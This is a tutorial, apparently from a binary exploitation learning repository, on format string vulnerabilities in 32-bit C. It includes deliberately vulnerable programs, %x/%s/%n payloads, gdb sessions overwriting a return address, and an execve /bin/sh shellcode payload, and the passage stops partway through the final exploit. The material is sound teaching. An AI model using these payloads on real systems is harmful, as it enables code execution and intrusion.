# Format string vulnerability

A format string vulnerability is a vulnerability about using vulnerable functions of the printf family, which don't check the format string itself. With a proper format specifier, you can view arbitrary data within the program, overwrite it and even control the flow of the program.

## View vulnerability

Consider this program:
```C
#include <stdio.h>
#include <string.h>

// gcc format-string.c -o format-string -m32

int main(int argc, char *argv[]){
  char buff[200];
  strncpy(buff, argv[1], 200);
  printf(buff);
  return 0;
}
```

Input usual string:
```bash
$ ./format-string "My String"
My String
```

Input string with format specifier `x`, which will show you hex:
```bash
$ ./format-string AAAA%x
AAAAfff932ef
```

You'll get some strange input...

Try another one:
```bash
$ ./format-string AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
AAAAffd972d4.c8.5665522b.0.0.0.ffd96424.0.41414141.252e7825
```

In this case, you got another artifact. Dots here is to simplify the view.

So, the artifact 41414141 is our string that we input at the beginning of the string. And this all is a stack. The program itself gives us the content of the stack.

```bash
$ ./format-string AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
AAAAffe442cb.c8.565d922b.0.0.0.ffe43aa4.0.41414141.252e7825.78252e78.2e78252e.252e7825
```

The next stuff is a continuation of our string.

### What can we do with it?

We can specify at the beginning of our string some address.

```bash
$ ./format-string $(python -c 'print "\xef\xbe\xad\xde" + "%x." * 100')
ﾭ�ffbb11c5.c8.565ad22b.0.0.0.ffbb0d04.0.deadbeef.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.5d688c00.ffbb0c70.0.0.f7dcdee5.f7f9a000.f7f9a000.
```

You see the value `0xdeadbeef` in the output. With different specifiers, we can write to this address or read what in this address.

## Format string specifiers

1. %d - decimal(int) - value.
2. %u - unsigned decimal(unsigned int) - value.
3. %x - hexadecimal(unsigned int) - value.
4. %s - string((const) unsigned char *) - reference.
5. %n - number of bytes written so far(* int) - reference.
6. %p - show what the pointer contains - value.

### Try different specifiers

```C
#include <stdio.h>

// gcc specifiers.c -o specifiers -m32

int main(int argc, char *argv[]){
  int num = -824;
  printf("Signed int: %d\n", num);
  unsigned int num2 = 10000;
  printf("Unsigned int: %u\n", num2);
  printf("Hexadecimal: %x\n", num);
  int *p = &num2;
  printf("Pointer: %p\n", p);
  const char *s = "Some string";
  printf("String: %s\n", s);
  int *count = &num2;
  printf("Number of bytes written: %n\n", count);
  printf("%u\n", *count);
  return 0;
}
```

On the last one, it will write the number of bytes written at the address within count pointer or num2, so, then I wrote this value and it's 25 bytes, which you can determine in python interpreter:
```bash
>>> len('Number of bytes written: ')
25
```

## Read arbitrary data

Consider this program:
```C
#include <stdio.h>
#include <string.h>
#include <unistd.h>

// gcc read-arbitrary-data.c -o read-arbitrary-data -m32

int main(int argc, char *argv[]){
  const char *allow = "Access granted.\n";
  const char *deny = "Access denied.\n";
  char buff[200];
  read(1, buff, 200);
  if (strncmp("password\0", buff, 9) == 0) {
    printf(allow);
    system("/bin/sh");
  } else {
    printf(deny);
    printf("Say goodbye!!!");
  }
  read(1, buff, 200);
  printf(buff);
}
```

Try to exploit it. Suppose that we don't know the password:
```bash
$ ./read-arbitrary-data
afasfsf
Access denied.
AAAAAAAAAAAAAAAAA
Say goodbye!!!AAAAAAAAAAAAAAAAA
```

Okay, we see that the program mirrors our string. Let's try format string.
```bash
$ ./read-arbitrary-data
asdfafaf
Access denied.
AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.
Say goodbye!!!AAAAffc06134.c8.5659824d.0.100.40.ffc062c4.0.0.0.56599008.56599019.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.
```

Again, you meet the value `0x41414141` which is the beginning of our string. But, what are the values before it? Check it out with %s.
```bash
$ ./read-arbitrary-data
sadfafa
Access denied.
AAAA%s %s %s %s %s %s %s %s %s %s
Say goodbye!!!AAAAAAAA%s %s %s %s %s %s %s %s %s %s
Segmentation fault (core dumped)
```

So, the program crashed because it can't find something useful at the address, for instance from the output above, of value `100` or `40`. These values are not the right address. And that's why you need to know about direct parameter access. In other words, you don't need to input chains like `%x.%x.%x.%x.%x.%x.%x.%x.`, you can access, for example, the `0x41414141` value from the output above, with this string `%13$s`. 13 is the number of the parameter in the format string, which is the beginning of our string. BUT. The format specifier `%s` is waiting for the address, but we will give it the value `0x41414141`.
```bash
$ ./read-arbitrary-data
asfasfa
Access denied.
AAAA%13$s
Segmentation fault (core dumped)
```

The program crashed.

Thus, with a little brute-force of the direct parameter access number or just specify the needed address at the beginning of the input string, you can read arbitrary data. Let's read the strings `Access denied.` and `Access granted.` which are just before our input string.
```bash
$ ./read-arbitrary-data
asfsadfas
Access denied.
AAAA%11$s%12$s
Say goodbye!!!AAAAAccess granted.
Access denied.

```

## Jump to an arbitrary address

Now you know how to read data that is not meant to be read. Then try writing some data, and here I will show you how to write an arbitrary address into the return address in the `format-string` binary so that you can jump to it later. You got to do disabling security techniques such as ASLR again.

### Determine where the return address is stored within the stack.

Firstly, place the breakpoint on the last instruction.
```bash
gef➤  disas main
Dump of assembler code for function main:
   0x080491b6 <+0>:	endbr32
   0x080491ba <+4>:	lea    ecx,[esp+0x4]
   0x080491be <+8>:	and    esp,0xfffffff0
   0x080491c1 <+11>:	push   DWORD PTR [ecx-0x4]
   0x080491c4 <+14>:	push   ebp
   0x080491c5 <+15>:	mov    ebp,esp
   0x080491c7 <+17>:	push   ebx
   0x080491c8 <+18>:	push   ecx
   0x080491c9 <+19>:	sub    esp,0xd0
   0x080491cf <+25>:	call   0x80490f0 <__x86.get_pc_thunk.bx>
   0x080491d4 <+30>:	add    ebx,0x2e2c
   0x080491da <+36>:	mov    eax,ecx
   0x080491dc <+38>:	mov    eax,DWORD PTR [eax+0x4]
   0x080491df <+41>:	add    eax,0x4
   0x080491e2 <+44>:	mov    eax,DWORD PTR [eax]
   0x080491e4 <+46>:	sub    esp,0x4
   0x080491e7 <+49>:	push   0xc8
   0x080491ec <+54>:	push   eax
   0x080491ed <+55>:	lea    eax,[ebp-0xd0]
   0x080491f3 <+61>:	push   eax
   0x080491f4 <+62>:	call   0x8049090 <strncpy@plt>
   0x080491f9 <+67>:	add    esp,0x10
   0x080491fc <+70>:	sub    esp,0xc
   0x080491ff <+73>:	lea    eax,[ebp-0xd0]
   0x08049205 <+79>:	push   eax
   0x08049206 <+80>:	call   0x8049070 <printf@plt>
   0x0804920b <+85>:	add    esp,0x10
   0x0804920e <+88>:	mov    eax,0x0
   0x08049213 <+93>:	lea    esp,[ebp-0x8]
   0x08049216 <+96>:	pop    ecx
   0x08049217 <+97>:	pop    ebx
   0x08049218 <+98>:	pop    ebp
   0x08049219 <+99>:	lea    esp,[ecx-0x4]
   0x0804921c <+102>:	ret    
End of assembler dump.
gef➤ b *main + 102
```

Secondly, determine the direct parameter number to your input:
```bash
gef➤  r $(python -c 'print "AAAA" + "%x." * 15')
Starting program: /home/shogun/repos/basics-of-pwn/content/format-string/format-string $(python -c 'print "AAAA" + "%x." * 15')

Breakpoint 1, 0x0804921c in main ()

gef➤  c
Continuing.
AAAAffffd269.c8.80491d4.0.0.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.[Inferior 1 (process 11316) exited normally]
```

The direct parameter number is 6.

Thirdly, when the program will stop at the breakpoint, view the stack.
```bash
gef➤  r $(python -c 'print "AAAA" + "%x." * 15')
Starting program: /home/shogun/repos/basics-of-pwn/content/format-string/format-string $(python -c 'print "AAAA" + "%x." * 15')

Breakpoint 1, 0x0804921c in main ()

gef➤  x/50wx $esp
0xffffcfbc:	0xf7ddbee5	0x00000002	0xffffd054	0xffffd060
0xffffcfcc:	0xffffcfe4	0xf7fa8000	0x00000000	0xffffd038
0xffffcfdc:	0x00000000	0xf7ffd000	0x00000000	0xf7fa8000
0xffffcfec:	0xf7fa8000	0x00000000	0xa458a854	0xe0ba6e44
0xffffcffc:	0x00000000	0x00000000	0x00000000	0x00000002
0xffffd00c:	0x080490a0	0x00000000	0xf7fe7b24	0xf7fe22f0
0xffffd01c:	0x0804c000	0x00000002	0x080490a0	0x00000000
0xffffd02c:	0x080490d6	0x080491b6	0x00000002	0xffffd054
0xffffd03c:	0x08049220	0x08049290	0xf7fe22f0	0xffffd04c
0xffffd04c:	0x0000001c	0x00000002	0xffffd224	0xffffd269
0xffffd05c:	0x00000000	0xffffd29b	0xffffd2ab	0xffffd2fb
0xffffd06c:	0xffffd30d	0xffffd320	0xffffd334	0xffffd368
0xffffd07c:	0xffffd3a2	0xffffd3b8
gef➤  ni
0xf7ddbee5 in __libc_start_main () from /lib/i386-linux-gnu/libc.so.6

gef➤  
```

Our value is `0xf7ddbee5`. Okay, so it is stored at `0xffffcfbc`.

### Try to write to the address

It's time to use `%n` specifier which will write the written size of the string to our address.
```bash
gef➤  r $(python -c 'print "\xbc\xcf\xff\xff" + "%6$x"')
Starting program: /home/shogun/repos/basics-of-pwn/content/format-string/format-string $(python -c 'print "\xbc\xcf\xff\xff" + "%6$x"')

Breakpoint 1, 0x0804921c in main ()

gef➤  x/50wx $esp
0xffffcfdc:	0xf7ddbee5	0x00000002	0xffffd074	0xffffd080
0xffffcfec:	0xffffd004	0xf7fa8000	0x00000000	0xffffd058
0xffffcffc:	0x00000000	0xf7ffd000	0x00000000	0xf7fa8000
0xffffd00c:	0xf7fa8000	0x00000000	0x9fb4e996	0xdb566f86
0xffffd01c:	0x00000000	0x00000000	0x00000000	0x00000002
0xffffd02c:	0x080490a0	0x00000000	0xf7fe7b24	0xf7fe22f0
0xffffd03c:	0x0804c000	0x00000002	0x080490a0	0x00000000
0xffffd04c:	0x080490d6	0x080491b6	0x00000002	0xffffd074
0xffffd05c:	0x08049220	0x08049290	0xf7fe22f0	0xffffd06c
0xffffd06c:	0x0000001c	0x00000002	0xffffd24d	0xffffd292
0xffffd07c:	0x00000000	0xffffd29b	0xffffd2ab	0xffffd2fb
0xffffd08c:	0xffffd30d	0xffffd320	0xffffd334	0xffffd368
0xffffd09c:	0xffffd3a2	0xffffd3b8
gef➤  c
Continuing.
����ffffcfbc[Inferior 1 (process 11587) exited normally]
gef➤  
```

Specify the address of the return value at the beginning of the input string. Then, show it in the output. You can see that the value was shifted. So, change the address at the beginning of the string and change the specifier from `x` to `n`.
```bash
gef➤  r $(python -c 'print "\xdc\xcf\xff\xff" + "%6$n"')
Starting program: /home/shogun/repos/basics-of-pwn/content/format-string/format-string $(python -c 'print "\xdc\xcf\xff\xff" + "%6$n"')

Breakpoint 1, 0x0804921c in main ()
gef➤  x/50wx $esp
0xffffcfdc:	0x00000004	0x00000002	0xffffd074	0xffffd080
0xffffcfec:	0xffffd004	0xf7fa8000	0x00000000	0xffffd058
0xffffcffc:	0x00000000	0xf7ffd000	0x00000000	0xf7fa8000
0xffffd00c:	0xf7fa8000	0x00000000	0x4291c779	0x06734169
0xffffd01c:	0x00000000	0x00000000	0x00000000	0x00000002
0xffffd02c:	0x080490a0	0x00000000	0xf7fe7b24	0xf7fe22f0
0xffffd03c:	0x0804c000	0x00000002	0x080490a0	0x00000000
0xffffd04c:	0x080490d6	0x080491b6	0x00000002	0xffffd074
0xffffd05c:	0x08049220	0x08049290	0xf7fe22f0	0xffffd06c
0xffffd06c:	0x0000001c	0x00000002	0xffffd24d	0xffffd292
0xffffd07c:	0x00000000	0xffffd29b	0xffffd2ab	0xffffd2fb
0xffffd08c:	0xffffd30d	0xffffd320	0xffffd334	0xffffd368
0xffffd09c:	0xffffd3a2	0xffffd3b8
gef➤  c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00000004 in ?? ()
```

Yeah, writing is happened. It wrote the 4 bytes cause we specified the 4 bytes at the beginning. Let's try change it to the first instruction of main function. So, our program will execute the main function twice.
```bash
gef➤  disas main
Dump of assembler code for function main:
   0x080491b6 <+0>:	endbr32
   0x080491ba <+4>:	lea    ecx,[esp+0x4]
   0x080491be <+8>:	and    esp,0xfffffff0
   0x080491c1 <+11>:	push   DWORD PTR [ecx-0x4]
   0x080491c4 <+14>:	push   ebp
   0x080491c5 <+15>:	mov    ebp,esp
   0x080491c7 <+17>:	push   ebx
   0x080491c8 <+18>:	push   ecx
   0x080491c9 <+19>:	sub    esp,0xd0
   0x080491cf <+25>:	call   0x80490f0 <__x86.get_pc_thunk.bx>
   0x080491d4 <+30>:	add    ebx,0x2e2c
   0x080491da <+36>:	mov    eax,ecx
   0x080491dc <+38>:	mov    eax,DWORD PTR [eax+0x4]
   0x080491df <+41>:	add    eax,0x4
   0x080491e2 <+44>:	mov    eax,DWORD PTR [eax]
   0x080491e4 <+46>:	sub    esp,0x4
   0x080491e7 <+49>:	push   0xc8
   0x080491ec <+54>:	push   eax
   0x080491ed <+55>:	lea    eax,[ebp-0xd0]
   0x080491f3 <+61>:	push   eax
   0x080491f4 <+62>:	call   0x8049090 <strncpy@plt>
   0x080491f9 <+67>:	add    esp,0x10
   0x080491fc <+70>:	sub    esp,0xc
   0x080491ff <+73>:	lea    eax,[ebp-0xd0]
   0x08049205 <+79>:	push   eax
   0x08049206 <+80>:	call   0x8049070 <printf@plt>
   0x0804920b <+85>:	add    esp,0x10
   0x0804920e <+88>:	mov    eax,0x0
   0x08049213 <+93>:	lea    esp,[ebp-0x8]
   0x08049216 <+96>:	pop    ecx
   0x08049217 <+97>:	pop    ebx
   0x08049218 <+98>:	pop    ebp
   0x08049219 <+99>:	lea    esp,[ecx-0x4]
=> 0x0804921c <+102>:	ret    
End of assembler dump.
gef➤  
```

Our first instruction of main is at the address `0x080491b6`. So, let's try to write it. Now, you need a `u` specifier. To specify before it the count of the numbers in unsigned int value.
```bash
$ python3
Python 3.8.5 (default, Jan 27 2021, 15:41:15)
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x080491b6
134517174
>>>
```

```bash
gef➤  r $(python -c 'print "\xdc\xcf\xff\xff" + "%134517170u" + "%6$n"')

Breakpoint 1, 0x0804921c in main ()
gef➤  x/50wx $esp
0xffffcfdc:	0x080491b6	0x00000002	0xffffd074	0xffffd080
0xffffcfec:	0xffffd004	0xf7fa8000	0x00000000	0xffffd058
0xffffcffc:	0x00000000	0xf7ffd000	0x00000000	0xf7fa8000
0xffffd00c:	0xf7fa8000	0x00000000	0xd207188e	0x96e59e9e
0xffffd01c:	0x00000000	0x00000000	0x00000000	0x00000002
0xffffd02c:	0x080490a0	0x00000000	0xf7fe7b24	0xf7fe22f0
0xffffd03c:	0x0804c000	0x00000002	0x080490a0	0x00000000
0xffffd04c:	0x080490d6	0x080491b6	0x00000002	0xffffd074
0xffffd05c:	0x08049220	0x08049290	0xf7fe22f0	0xffffd06c
0xffffd06c:	0x0000001c	0x00000002	0xffffd242	0xffffd287
0xffffd07c:	0x00000000	0xffffd29b	0xffffd2ab	0xffffd2fb
0xffffd08c:	0xffffd30d	0xffffd320	0xffffd334	0xffffd368
0xffffd09c:	0xffffd3a2	0xffffd3b8
gef➤  i r
eax            0x0                 0x0
ecx            0xffffcfe0          0xffffcfe0
edx            0x77fb6e49          0x77fb6e49
ebx            0x0                 0x0
esp            0xffffcfdc          0xffffcfdc
ebp            0x0                 0x0
esi            0xf7fa8000          0xf7fa8000
edi            0xf7fa8000          0xf7fa8000
eip            0x804921c           0x804921c <main+102>
eflags         0x286               [ PF SF IF ]
cs             0x23                0x23
ss             0x2b                0x2b
ds             0x2b                0x2b
es             0x2b                0x2b
fs             0x0                 0x0
gs             0x63                0x63
gef➤  ni
0x080491b6 in main ()
gef➤  i r
eax            0x0                 0x0
ecx            0xffffcfe0          0xffffcfe0
edx            0x77fb6e49          0x77fb6e49
ebx            0x0                 0x0
esp            0xffffcfe0          0xffffcfe0
ebp            0x0                 0x0
esi            0xf7fa8000          0xf7fa8000
edi            0xf7fa8000          0xf7fa8000
eip            0x80491b6           0x80491b6 <main>
eflags         0x286               [ PF SF IF ]
cs             0x23                0x23
ss             0x2b                0x2b
ds             0x2b                0x2b
es             0x2b                0x2b
fs             0x0                 0x0
gs             0x63                0x63
```

You see that the program executes the main function a second time.

## Writing in several stages

Okay, in the previous subsection, I showed you how to overwrite the return address. But sometimes there are cases when we can't write desired address in one step. At this moment, it's time to write in several stages.

Let's overwrite the address as above, but with several stages.

Firstly, you need to understand how to specify the address at the beginning of the input string. If we want to overwrite the address in the several stages, we need to write by 2 bytes or by 1 byte at a time. For instance, consider that we want to write to the address `0xffffcfdc`, but we can't do it in one step. Though we can write first to the address `0xffffcfdc` 2 bytes, then to the address `0xffffcfdc` + 0x2, but so, that we don't change the value of the previous 2 bytes. With 1 byte at a time writing there will be `0xffffcfdc`, `0xffffcfdc` + 0x1, `0xffffcfdc` + 0x2, `0xffffcfdc` + 0x3.

I will show you the 2 steps of writing. We need to write the value `0x080491b6`. So, the first value to write is `0x91b6`. The second is `0x0804`.

```bash
$ python3
Python 3.8.5 (default, Jan 27 2021, 15:41:15)
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x91b6
37302
>>>
```

```bash
gef➤  r $(python -c 'print "\xdc\xcf\xff\xff" + "%37298u" + "%6$n"')
Starting program: /home/shogun/repos/basics-of-pwn/content/format-string/format-string $(python -c 'print "\xdc\xcf\xff\xff" + "%37298u" + "%6$n"')

gef➤  x/50wx $esp
0xffffcfdc:	0x000091b6	0x00000002	0xffffd074	0xffffd080
0xffffcfec:	0xffffd004	0xf7fa8000	0x00000000	0xffffd058
0xffffcffc:	0x00000000	0xf7ffd000	0x00000000	0xf7fa8000
0xffffd00c:	0xf7fa8000	0x00000000	0x8da201d0	0xc94087c0
0xffffd01c:	0x00000000	0x00000000	0x00000000	0x00000002
0xffffd02c:	0x080490a0	0x00000000	0xf7fe7b24	0xf7fe22f0
0xffffd03c:	0x0804c000	0x00000002	0x080490a0	0x00000000
0xffffd04c:	0x080490d6	0x080491b6	0x00000002	0xffffd074
0xffffd05c:	0x08049220	0x08049290	0xf7fe22f0	0xffffd06c
0xffffd06c:	0x0000001c	0x00000002	0xffffd246	0xffffd28b
0xffffd07c:	0x00000000	0xffffd29b	0xffffd2ab	0xffffd2fb
0xffffd08c:	0xffffd30d	0xffffd320	0xffffd334	0xffffd368
0xffffd09c:	0xffffd3a2	0xffffd3b8
gef➤  
```

So, we wrote the value `0x91b6`.

```bash
>>> 0x0804
2052
>>>
```

```bash
gef➤  r $(python -c 'print "\xdc\xcf\xff\xff" + "\xde\xcf\xff\xff" + "%37294u" + "%6$n" + "%2052u" + "%7$n"')
Starting program: /home/shogun/repos/basics-of-pwn/content/format-string/format-string $(python -c 'print "\xdc\xcf\xff\xff" + "\xde\xcf\xff\xff" + "%37294u" + "%6$n" + "%2052u" + "%7$n"')
��������

gef➤  x/50wx $esp
0xffffcfcc:	0xf7ddbee5	0x00000002	0xffffd064	0xffffd070
0xffffcfdc:	0x99ba91b6	0xf7fa0000	0x00000000	0xffffd048
0xffffcfec:	0x00000000	0xf7ffd000	0x00000000	0xf7fa8000
0xffffcffc:	0xf7fa8000	0x00000000	0x2694ebfe	0x62760dee
0xffffd00c:	0x00000000	0x00000000	0x00000000	0x00000002
0xffffd01c:	0x080490a0	0x00000000	0xf7fe7b24	0xf7fe22f0
0xffffd02c:	0x0804c000	0x00000002	0x080490a0	0x00000000
0xffffd03c:	0x080490d6	0x080491b6	0x00000002	0xffffd064
0xffffd04c:	0x08049220	0x08049290	0xf7fe22f0	0xffffd05c
0xffffd05c:	0x0000001c	0x00000002	0xffffd238	0xffffd27d
0xffffd06c:	0x00000000	0xffffd29b	0xffffd2ab	0xffffd2fb
0xffffd07c:	0xffffd30d	0xffffd320	0xffffd334	0xffffd368
0xffffd08c:	0xffffd3a2	0xffffd3b8
```

You can see that I added a second address that is shifted on 2 bytes. Next, decrease the value `37298` on 4 bytes, cause the n specifier will write the number of bytes which we wrote before and we wrote an additional 4 bytes. Next, after the `%6$n` I added a new `%u` specifier and after it `%7$n` so, the program will write to the next address after the first address. Also, you can see that the program contains the value `0x99ba91b6` at the address `0xffffcfdc`.

We wrote to this address value 37294 + 2052 + 8 bytes as 2 address = `0x99ba`. Thus, we can't write another 2 bytes too easily. Need to overflow the value `0xffff` and then write the value `0x0804`. `0xffff` + `0x0804` - `0x91b6` - `0x8` = `30285`. With a little guess it is easy to determine the true value in the second `u` specifier.

```bash
gef➤  r $(python -c 'print "\xdc\xcf\xff\xff" + "\xde\xcf\xff\xff" + "%37294u" + "%6$n" + "%30285u" + "%7$n"')
Starting program: /home/shogun/repos/basics-of-pwn/content/format-string/format-string $(python -c 'print "\xdc\xcf\xff\xff" + "\xde\xcf\xff\xff" + "%37294u" + "%6$n" + "%30285u" + "%7$n"')
��������

gef➤  x/50wx $esp
0xffffcfcc:	0xf7ddbee5	0x00000002	0xffffd064	0xffffd070
0xffffcfdc:	0x080391b6	0xf7fa0001	0x00000000	0xffffd048
0xffffcfec:	0x00000000	0xf7ffd000	0x00000000	0xf7fa8000
0xffffcffc:	0xf7fa8000	0x00000000	0xa6c21c38	0xe220fa28
0xffffd00c:	0x00000000	0x00000000	0x00000000	0x00000002
0xffffd01c:	0x080490a0	0x00000000	0xf7fe7b24	0xf7fe22f0
0xffffd02c:	0x0804c000	0x00000002	0x080490a0	0x00000000
0xffffd03c:	0x080490d6	0x080491b6	0x00000002	0xffffd064
0xffffd04c:	0x08049220	0x08049290	0xf7fe22f0	0xffffd05c
0xffffd05c:	0x0000001c	0x00000002	0xffffd237	0xffffd27c
0xffffd06c:	0x00000000	0xffffd29b	0xffffd2ab	0xffffd2fb
0xffffd07c:	0xffffd30d	0xffffd320	0xffffd334	0xffffd368
0xffffd08c:	0xffffd3a2	0xffffd3b8
gef➤  r $(python -c 'print "\xdc\xcf\xff\xff" + "\xde\xcf\xff\xff" + "%37294u" + "%6$n" + "%30286u" + "%7$n"')
Starting program: /home/shogun/repos/basics-of-pwn/content/format-string/format-string $(python -c 'print "\xdc\xcf\xff\xff" + "\xde\xcf\xff\xff" + "%37294u" + "%6$n" + "%30286u" + "%7$n"')
��������

gef➤  x/50wx $esp
0xffffcfcc:	0xf7ddbee5	0x00000002	0xffffd064	0xffffd070
0xffffcfdc:	0x080491b6	0xf7fa0001	0x00000000	0xffffd048
0xffffcfec:	0x00000000	0xf7ffd000	0x00000000	0xf7fa8000
0xffffcffc:	0xf7fa8000	0x00000000	0x3b43ec89	0x7fa10a99
0xffffd00c:	0x00000000	0x00000000	0x00000000	0x00000002
0xffffd01c:	0x080490a0	0x00000000	0xf7fe7b24	0xf7fe22f0
0xffffd02c:	0x0804c000	0x00000002	0x080490a0	0x00000000
0xffffd03c:	0x080490d6	0x080491b6	0x00000002	0xffffd064
0xffffd04c:	0x08049220	0x08049290	0xf7fe22f0	0xffffd05c
0xffffd05c:	0x0000001c	0x00000002	0xffffd237	0xffffd27c
0xffffd06c:	0x00000000	0xffffd29b	0xffffd2ab	0xffffd2fb
0xffffd07c:	0xffffd30d	0xffffd320	0xffffd334	0xffffd368
0xffffd08c:	0xffffd3a2	0xffffd3b8
gef➤  
```

Thus, we wrote the desirable value to this address.

## Exploitation

Now, it's time to show how to exploit this type of vulnerability.

The technique stays the same as with stack overflow. It is just another way to execute your shellcode.

Payload will be next: `the return address` + `shellcode` + `specifiers to overwrite the return address`. I will show on `format-string` binary again and will use exploit from stack overflow section.

We already know where the return address is, so, just place the shellcode after the address at the beginning of the input string.
```bash
gef➤  r $(python -c 'print "\xdc\xcf\xff\xff" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "%6$x"')
Starting program: /home/shogun/repos/basics-of-pwn/content/format-string/format-string $(python -c 'print "\xdc\xcf\xff\xff" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "%6$x"')

Breakpoint 1, 0x0804921c in main ()
gef➤  x/100wx $esp - 0x100
0xffffcedc:	0x0804920b	0xffffcef8	0xffffd28f	0x000000c8
0xffffceec:	0x080491d4	0x00000000	0x00000000	0xffffcfdc
0xffffcefc:	0x6850c031	0x68732f2f	0x69622f68	0x50e3896e
0xffffcf0c:	0xb0e18953	0x2580cd0b	0x00782436	0x00000000
0xffffcf1c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf2c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf3c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf4c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf5c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf6c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf7c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf8c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf9c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcfac:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcfbc:	0x00000000	0xffffcfe0	0x00000000	0x00000000
0xffffcfcc:	0xf7ddbee5	0xf7fa8000	0xf7fa8000	0x00000000
0xffffcfdc:	0xf7ddbee5	0x00000002	0xffffd074	0xffffd080
0xffffcfec:	0xffffd004	0xf7fa8000	0x00000000	0xffffd058
0xffffcffc:	0x00000000	0xf7ffd000	0x00000000	0xf7fa8000
0xffffd00c:	0xf7fa8000	0x00000000	0x0cd8d390	0x483a5580
0xffffd01c:	0x00000000	0x00000000	0x00000000	0x00000002
0xffffd02c:	0x080490a0	0x00000000	0xf7fe7b24	0xf7fe22f0
0xffffd03c:	0x0804c000	0x00000002	0x080490a0	0x00000000
0xffffd04c:	0x080490d6	0x080491b6	0x00000002	0xffffd074
0xffffd05c:	0x08049220	0x08049290	0xf7fe22f0	0xffffd06c
gef➤  
```

You can see that the shellcode is placed at `0xffffcefc`. `0xffffcefc` is 4294954748 in decimal. We need to decrease it by subtracting 4 bytes and then the length of the shellcode which is 23 bytes = 27 bytes. 4294954721 is our value.

```bash
gef➤  r $(python -c 'print "\xdc\xcf\xff\xff" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "%4294954721u" + "%6$n"')
Starting program: /home/shogun/repos/basics-of-pwn/content/format-string/format-string $(python -c 'print "\xdc\xcf\xff\xff" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "%4294954721u" + "%6$n"')

Breakpoint 1, 0x0804921c in main ()
gef➤  x/100wx $esp - 0x100
0xffffcecc:	0x0804920b	0xffffcee8	0xffffd283	0x000000c8
0xffffcedc:	0x080491d4	0x00000000	0x00000000	0xffffcfdc
0xffffceec:	0x6850c031	0x68732f2f	0x69622f68	0x50e3896e
0xffffcefc:	0xb0e18953	0x2580cd0b	0x34393234	0x37343539
0xffffcf0c:	0x25753332	0x006e2436	0x00000000	0x00000000
0xffffcf1c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf2c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf3c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf4c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf5c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf6c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf7c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf8c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcf9c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcfac:	0x00000000	0xffffcfd0	0x00000000	0x00000000
0xffffcfbc:	0xf7ddbee5	0xf7fa8000	0xf7fa8000	0x00000000
0xffffcfcc:	0xf7ddbee5	0x00000002	0xffffd064	0xffffd070
0xffffcfdc:	0xffffcff4	0xf7fa8000	0x00000000	0xffffd048
0xffffcfec:	0x00000000	0xf7ffd000	0x00000000	0xf7fa8000
0xffffcffc:	0xf7fa8000	0x00000000	0x64e27305	0x20009515
0xffffd00c:	0x00000000	0x00000000	0x00000000	0x00000002
0xffffd01c:	0x080490a0	0x00000000	0xf7fe7b24	0xf7fe22f0
0xffffd02c:	0x0804c000	0x00000002	0x080490a0	0x00000000
0xffffd03c:	0x080490d6	0x080491b6	0x00000002	0xffffd064
0xffffd04c:	0x08049220	0x08049290	0xf7fe22f0	0xffffd05c
gef➤  
```

The value at the `0xffffcfdc` changed, but it is not what we need. It is a case when you need to write in several stages. Okay.

A value to write in the first stage is `53181`. Which is 0xcfdc - 27 - 4 (because we will add another address with an offset of 2 bytes).

```bash
gef➤  r $(python -c 'print "\xdc\xcf\xff\xff" + "\xde\xcf\xff\xff" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "%53181u" + "%6$n"')
